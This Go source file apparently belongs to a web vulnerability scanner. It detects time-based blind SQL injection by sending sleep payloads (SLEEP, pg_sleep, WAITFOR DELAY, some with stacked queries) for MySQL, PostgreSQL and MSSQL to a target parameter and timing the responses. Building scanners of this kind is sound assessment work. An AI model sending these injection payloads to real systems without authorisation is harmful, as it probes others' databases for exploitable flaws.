package injection

import (
	"context"
	"fmt"
	"time"

	assayhttp "github.com/TyrusRC/assay/internal/http"
)

// TimeBasedResult contains the result of time-based blind SQLi detection.
type TimeBasedResult struct {
	IsVulnerable  bool
	DetectionType string
	Confidence    float64
	Payload       string
	BaselineTime  time.Duration
	DelayedTime   time.Duration
	DatabaseType  DatabaseType
}

// timeBasedPayload pairs a sleep payload with its expected delay and DB type.
type timeBasedPayload struct {
	value  string
	delay  time.Duration
	dbType DatabaseType
}

var timeBasedPayloads = []timeBasedPayload{
	// MySQL/MariaDB
	{"' OR SLEEP(3)-- ", 3 * time.Second, DBMySQL},
	{"' AND SLEEP(3)-- ", 3 * time.Second, DBMySQL},
	{"1' AND (SELECT SLEEP(3))-- ", 3 * time.Second, DBMySQL},

	// PostgreSQL
	{"' OR pg_sleep(3)-- ", 3 * time.Second, DBPostgreSQL},
	{"'; SELECT pg_sleep(3)-- ", 3 * time.Second, DBPostgreSQL},
	{"1' AND (SELECT pg_sleep(3))::text=''-- ", 3 * time.Second, DBPostgreSQL},

	// MSSQL
	{"'; WAITFOR DELAY '0:0:3'-- ", 3 * time.Second, DBMSSQL},
	{"' AND 1=1; WAITFOR DELAY '0:0:3'-- ", 3 * time.Second, DBMSSQL},

	// Generic numeric context
	{"1 OR SLEEP(3)", 3 * time.Second, DBMySQL},
	{"1; SELECT pg_sleep(3)", 3 * time.Second, DBPostgreSQL},
}

// DetectTimeBased probes a parameter for time-based blind SQLi by sending
// sleep payloads and measuring response time against a baseline. A hit
// requires TWO consecutive delayed responses to rule out network jitter.
func (d *SQLiDetector) DetectTimeBased(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL, param, method string,
) (*TimeBasedResult, error) {
	res := &TimeBasedResult{}
	if client == nil {
		return res, nil
	}

	var baselineTotal time.Duration
	for i := 0; i < 2; i++ {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}
		start := time.Now()
		_, err := client.SendPayload(ctx, targetURL, param, "baseline_timing_probe", method)
		elapsed := time.Since(start)
		if err != nil {
			return res, fmt.Errorf("baseline timing failed: %w", err)
		}
		baselineTotal += elapsed
	}
	baselineAvg := baselineTotal / 2

	tolerance := 1 * time.Second
	// The delayed response must exceed baseline by at least minDelta to
	// distinguish a real SLEEP from normal network jitter.
	minDelta := 2 * time.Second

	for _, p := range timeBasedPayloads {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}

		if baselineAvg >= p.delay-tolerance {
			continue
		}

		start1 := time.Now()
		_, err := client.SendPayload(ctx, targetURL, param, p.value, method)
		elapsed1 := time.Since(start1)
		if err != nil {
			continue
		}

		if elapsed1 < p.delay-tolerance {
			continue
		}
		if elapsed1-baselineAvg < minDelta {
			continue
		}

		start2 := time.Now()
		_, err = client.SendPayload(ctx, targetURL, param, p.value, method)
		elapsed2 := time.Since(start2)
		if err != nil {
			continue
		}

		if elapsed2 < p.delay-tolerance {
			continue
		}
		if elapsed2-baselineAvg < minDelta {
			continue
		}

		res.IsVulnerable = true
		res.DetectionType = "time-based"
		res.Payload = p.value
		res.BaselineTime = baselineAvg
		res.DelayedTime = (elapsed1 + elapsed2) / 2
		res.DatabaseType = p.dbType
		res.Confidence = 0.85
		return res, nil
	}

	return res, nil
}

// DetectTimeBasedAt is the location-aware variant that uses a send function.
func (d *SQLiDetector) DetectTimeBasedAt(
	ctx context.Context,
	client *assayhttp.Client,
	targetURL string,
	param string,
	method string,
	send func(ctx context.Context, payload string) (*assayhttp.Response, error),
) (*TimeBasedResult, error) {
	res := &TimeBasedResult{}
	if client == nil {
		return res, nil
	}

	var baselineTotal time.Duration
	for i := 0; i < 2; i++ {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}
		start := time.Now()
		_, err := send(ctx, "baseline_timing_probe")
		elapsed := time.Since(start)
		if err != nil {
			return res, fmt.Errorf("baseline timing failed: %w", err)
		}
		baselineTotal += elapsed
	}
	baselineAvg := baselineTotal / 2
	tolerance := 1 * time.Second
	minDelta := 2 * time.Second

	for _, p := range timeBasedPayloads {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}
		if baselineAvg >= p.delay-tolerance {
			continue
		}
		start1 := time.Now()
		_, err := send(ctx, p.value)
		elapsed1 := time.Since(start1)
		if err != nil {
			continue
		}
		if elapsed1 < p.delay-tolerance {
			continue
		}
		if elapsed1-baselineAvg < minDelta {
			continue
		}
		start2 := time.Now()
		_, err = send(ctx, p.value)
		elapsed2 := time.Since(start2)
		if err != nil {
			continue
		}
		if elapsed2 < p.delay-tolerance {
			continue
		}
		if elapsed2-baselineAvg < minDelta {
			continue
		}
		res.IsVulnerable = true
		res.DetectionType = "time-based"
		res.Payload = p.value
		res.BaselineTime = baselineAvg
		res.DelayedTime = (elapsed1 + elapsed2) / 2
		res.DatabaseType = p.dbType
		res.Confidence = 0.85
		return res, nil
	}
	return res, nil
}
